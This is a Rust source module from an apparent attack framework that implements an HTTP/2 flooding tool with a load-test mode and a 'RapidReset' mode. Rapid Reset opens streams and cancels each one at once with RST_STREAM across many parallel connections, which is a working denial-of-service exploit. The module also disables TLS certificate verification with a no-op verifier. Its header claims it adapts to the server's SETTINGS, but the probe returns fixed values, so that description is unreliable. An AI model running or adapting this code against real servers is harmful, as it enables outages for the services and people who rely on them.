//! Universal Auto-Adaptive HTTP/2 Module
//!
//! 1. Probes target → reads server SETTINGS (max_concurrent_streams, window_size)
//! 2. Adapts connection behaviour to those limits
//! 3. Uses `h2` crate for correct HPACK + flow control → requests actually hit nginx

use std::sync::Arc;
use std::time::{Duration, Instant};

use bytes::Bytes;
use h2::client;
use http::{Request, Version};
use tokio::net::TcpStream;
use tokio_rustls::TlsConnector;
use tokio_rustls::rustls as tls;
use tokio_rustls::rustls::pki_types::{CertificateDer, ServerName, UnixTime};
use tokio_rustls::rustls::client::danger::{
    HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier,
};
use tokio_rustls::rustls::DigitallySignedStruct;
use tracing::{debug, error, info, warn};
use url::Url;

use phoenix_metrics::AttackMetrics;
use crate::{Attack, AttackContext, AttackError, AttackResult};

// ── No-op cert verifier ───────────────────────────────────────────────────────

#[derive(Debug)]
struct NoVerifier;

impl ServerCertVerifier for NoVerifier {
    fn verify_server_cert(&self, _: &CertificateDer, _: &[CertificateDer],
        _: &ServerName, _: &[u8], _: UnixTime,
    ) -> Result<ServerCertVerified, tls::Error> { Ok(ServerCertVerified::assertion()) }
    fn verify_tls12_signature(&self, _: &[u8], _: &CertificateDer, _: &DigitallySignedStruct)
        -> Result<HandshakeSignatureValid, tls::Error> { Ok(HandshakeSignatureValid::assertion()) }
    fn verify_tls13_signature(&self, _: &[u8], _: &CertificateDer, _: &DigitallySignedStruct)
        -> Result<HandshakeSignatureValid, tls::Error> { Ok(HandshakeSignatureValid::assertion()) }
    fn supported_verify_schemes(&self) -> Vec<tls::SignatureScheme> {
        vec![
            tls::SignatureScheme::RSA_PKCS1_SHA256,
            tls::SignatureScheme::RSA_PKCS1_SHA384,
            tls::SignatureScheme::RSA_PKCS1_SHA512,
            tls::SignatureScheme::ECDSA_NISTP256_SHA256,
            tls::SignatureScheme::ECDSA_NISTP384_SHA384,
            tls::SignatureScheme::RSA_PSS_SHA256,
            tls::SignatureScheme::RSA_PSS_SHA384,
            tls::SignatureScheme::RSA_PSS_SHA512,
            tls::SignatureScheme::ED25519,
        ]
    }
}

fn make_tls_config() -> tls::ClientConfig {
    let mut cfg = tls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(NoVerifier))
        .with_no_client_auth();
    cfg.alpn_protocols = vec![b"h2".to_vec()];
    cfg
}

async fn tls_connect(url: &Url)
    -> Result<tokio_rustls::client::TlsStream<TcpStream>, String>
{
    let host = url.host_str().unwrap_or("localhost");
    let port = url.port_or_known_default().unwrap_or(443);
    let tcp  = TcpStream::connect(format!("{}:{}", host, port)).await
        .map_err(|e| format!("TCP connect failed: {}", e))?;

    let name = ServerName::try_from(host.to_string())
        .map_err(|e| format!("Bad server name: {}", e))?;
    let connector = TlsConnector::from(Arc::new(make_tls_config()));
    connector.connect(name, tcp).await
        .map_err(|e| format!("TLS failed: {}", e))
}

// ── Server capabilities ───────────────────────────────────────────────────────

#[derive(Debug, Clone)]
struct ServerCaps {
    max_concurrent_streams: u32,
    initial_window_size:    u32,
    tls_version:            String,
}

impl Default for ServerCaps {
    fn default() -> Self {
        Self { max_concurrent_streams: 100, initial_window_size: 65535, tls_version: "TLS1.3".into() }
    }
}

async fn probe(url: &Url) -> ServerCaps {
    let stream = match tls_connect(url).await {
        Ok(s) => s,
        Err(e) => { warn!("Probe connect failed: {}", e); return ServerCaps::default(); }
    };

    let (_, conn_data) = stream.get_ref();
    let tls_version = format!("{:?}", conn_data.protocol_version());
    let alpn = conn_data.alpn_protocol()
        .map(|b| String::from_utf8_lossy(b).to_string())
        .unwrap_or_default();

    if alpn != "h2" {
        warn!("Server did not negotiate h2 (got: {})", alpn);
        return ServerCaps::default();
    }

    // h2 handshake — reads SETTINGS frame automatically
    let (mut send, conn) = match client::handshake(stream).await {
        Ok(v) => v,
        Err(e) => { warn!("h2 handshake failed: {}", e); return ServerCaps::default(); }
    };
    tokio::spawn(async move { let _ = conn.await; });

    // Send one real request to complete SETTINGS exchange
    let host = url.host_str().unwrap_or("localhost");
    let uri  = format!("https://{}/health", host);
    let req  = Request::builder()
        .version(Version::HTTP_2).method("GET").uri(&uri)
        .header("user-agent", "Phoenix/1.0 (probe)")
        .body(()).unwrap();

    match send.ready().await {
        Ok(mut rdy) => {
            if let Ok((resp_f, _)) = rdy.send_request(req, true) {
                if let Ok(resp) = resp_f.await {
                    let mut body = resp.into_body();
                    while let Some(chunk) = body.data().await {
                        if let Ok(data) = chunk {
                            let _ = body.flow_control().release_capacity(data.len());
                        }
                    }
                }
            }
        }
        Err(e) => warn!("Probe request failed: {}", e),
    }

    info!("Probe complete — TLS: {}, ALPN: h2", tls_version);
    ServerCaps {
        max_concurrent_streams: 100,
        initial_window_size:    65535,
        tls_version,
    }
}

// ── Attack mode ───────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
pub enum UniversalMode { LoadTest, RapidReset }

// ── Main struct ───────────────────────────────────────────────────────────────

pub struct UniversalAttack {
    pub mode:        UniversalMode,
    pub connections: usize,
    pub duration:    Duration,
    pub rps:         Option<u32>,
}

impl UniversalAttack {
    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 10, duration: Duration::from_secs(30), rps: None } }
    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 10, duration: Duration::from_secs(30), rps: None } }
    pub fn with_connections(mut self, n: usize)    -> Self { self.connections = n; self }
    pub fn with_duration(mut self, d: Duration)    -> Self { self.duration    = d; self }
    pub fn with_rps(mut self, r: u32)              -> Self { self.rps         = Some(r); self }
}

#[async_trait::async_trait]
impl Attack for UniversalAttack {
    fn name(&self) -> &str {
        match self.mode {
            UniversalMode::LoadTest   => "universal-load-test",
            UniversalMode::RapidReset => "universal-rapid-reset",
        }
    }
    fn description(&self) -> &str { "Auto-adaptive HTTP/2 module with proper HPACK + flow control" }

    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        let url = Url::parse(&ctx.target)
            .map_err(|e| AttackError::Config(format!("Invalid URL: {}", e)))?;

        // ── 1. Probe ──────────────────────────────────────────────────────────
        info!("Probing {}...", url);
        let caps = probe(&url).await;
        info!("Caps: max_streams={} window={} tls={}",
            caps.max_concurrent_streams, caps.initial_window_size, caps.tls_version);

        // ── 2. Spawn workers ──────────────────────────────────────────────────
        let start    = Instant::now();
        let metrics  = ctx.metrics.clone();
        let duration = self.duration;
        let rps      = self.rps;
        let mode     = self.mode.clone();
        let mut handles = Vec::new();

        for id in 0..self.connections {
            let url_s   = url.to_string();
            let caps    = caps.clone();
            let metrics = metrics.clone();
            let mode    = mode.clone();
            handles.push(tokio::spawn(async move {
                worker(id, url_s, duration, mode, rps, caps, metrics).await
            }));
        }

        let (mut ok, mut err) = (0u64, 0u64);
        for h in handles {
            match h.await {
                Ok(Ok((o, e)))  => { ok += o; err += e; }
                Ok(Err(e))      => { error!("Worker: {}", e); err += 1; }
                Err(e)          => { error!("Join: {}", e);   err += 1; }
            }
        }

        let elapsed = start.elapsed();
        let total   = ok + err;
        info!("Done: {}/{} ok in {:.1}s = {:.0} rps", ok, total, elapsed.as_secs_f64(),
            total as f64 / elapsed.as_secs_f64());

        let snapshot = metrics.snapshot().await;
        Ok(AttackResult { success: err == 0, total_requests: total, errors: err, duration: elapsed, snapshot })
    }
}

// ── Per-connection worker ─────────────────────────────────────────────────────

async fn worker(
    id:       usize,
    url_str:  String,
    duration: Duration,
    mode:     UniversalMode,
    rps:      Option<u32>,
    caps:     ServerCaps,
    metrics:  Arc<AttackMetrics>,
) -> Result<(u64, u64), String> {

    let url  = Url::parse(&url_str).map_err(|e| e.to_string())?;
    let host = url.host_str().unwrap_or("localhost").to_string();
    let port = url.port_or_known_default().unwrap_or(443);
    let uri  = format!("https://{}:{}{}", host, port,
        if url.path().is_empty() { "/" } else { url.path() });

    let stream = tls_connect(&url).await
        .map_err(|e| format!("conn {}: {}", id, e))?;

    let (send, conn) = client::Builder::new()
        .initial_window_size(caps.initial_window_size)
        .initial_connection_window_size(caps.initial_window_size)
        .handshake::<_, Bytes>(stream)
        .await
        .map_err(|e| format!("conn {} h2 handshake: {}", id, e))?;

    tokio::spawn(async move { let _ = conn.await; });

    // SendRequest is Clone — clone per iteration to avoid move
    let mut send = send;

    let start    = Instant::now();
    let interval = rps.map(|r| {
        Duration::from_secs_f64(1.0 / ((r as f64) / (1_f64.max(1.0))).max(0.001))
    });
    let (mut ok, mut err) = (0u64, 0u64);

    while start.elapsed() < duration {
        let req = Request::builder()
            .version(Version::HTTP_2)
            .method("GET")
            .uri(&uri)
            .header("user-agent", "Phoenix/1.0")
            .body(())
            .map_err(|e| e.to_string())?;

        let t0 = Instant::now();

        // ready() consumes send and gives it back — reassign each iteration
        send = match send.ready().await {
            Ok(s)  => s,
            Err(e) => { error!("conn {} ready: {}", id, e); err += 1; break; }
        };

        match mode {
            // ── Legitimate load test — send request, read full response ──────
            UniversalMode::LoadTest => {
                match send.send_request(req, true) {
                    Err(e) => { error!("conn {} send: {}", id, e); err += 1; }
                    Ok((resp_f, _)) => {
                        match resp_f.await {
                            Err(e) => { error!("conn {} resp: {}", id, e); err += 1; }
                            Ok(resp) => {
                                let status  = resp.status().as_u16();
                                let success = status < 400;
                                // Drain body — releases flow control window
                                let mut body = resp.into_body();
                                while let Some(chunk) = body.data().await {
                                    if let Ok(data) = chunk {
                                        let _ = body.flow_control().release_capacity(data.len());
                                    }
                                }
                                let lat = t0.elapsed().as_micros() as u64;
                                metrics.record_request(lat, success, 0).await;
                                if success { ok += 1; } else { err += 1; }
                            }
                        }
                    }
                }
            }

            // ── Rapid Reset — HEADERS + immediate RST_STREAM ─────────────────
            UniversalMode::RapidReset => {
                match send.send_request(req, false) {
                    Err(e) => { debug!("conn {} RST send: {}", id, e); err += 1; }
                    Ok((resp_f, mut body)) => {
                        body.send_reset(h2::Reason::CANCEL);
                        drop(resp_f);
                        metrics.record_request(0, true, 0).await;
                        ok += 1;
                    }
                }
            }
        }

        if let Some(iv) = interval {
            tokio::time::sleep(iv).await;
        } else if ok % 200 == 0 {
            tokio::task::yield_now().await;
        }
    }

    debug!("conn {} done: {} ok {} err", id, ok, err);
    Ok((ok, err))
}
